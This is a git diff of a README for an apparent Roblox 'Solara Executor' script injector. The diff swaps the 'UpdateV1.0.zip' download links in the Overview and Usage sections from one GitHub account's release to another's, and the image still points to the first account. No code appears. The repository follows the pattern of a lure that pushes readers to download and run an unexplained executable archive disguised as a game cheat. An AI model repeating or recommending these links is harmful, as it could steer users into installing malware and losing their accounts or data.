@@ -1,7 +1,7 @@
 ## Overview
 This repository contains a Roblox **Solara Executor** designed to enhance user experience within the ROBLOX gaming platform. The injector facilitates the injection of custom scripts into ROBLOX games, allowing users to modify and extend gameplay functionalities.
 
-# [Download](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/UpdateV1.0.zip)
+# [Download](https://github.com/venskoske13/Solara-Roblox-Download/releases/download/Download/UpdateV1.0.zip)
 
 ![image](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/zz.jpg)
 
@@ -12,7 +12,7 @@ This repository contains a Roblox **Solara Executor** designed to enhance user e
   
 ## Usage
 
- * [Download](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/UpdateV1.0.zip) the zip archive. <br>
+ * [Download](https://github.com/venskoske13/Solara-Roblox-Download/releases/download/Download/UpdateV1.0.zip) the zip archive. <br>
 
  
 ## Notes
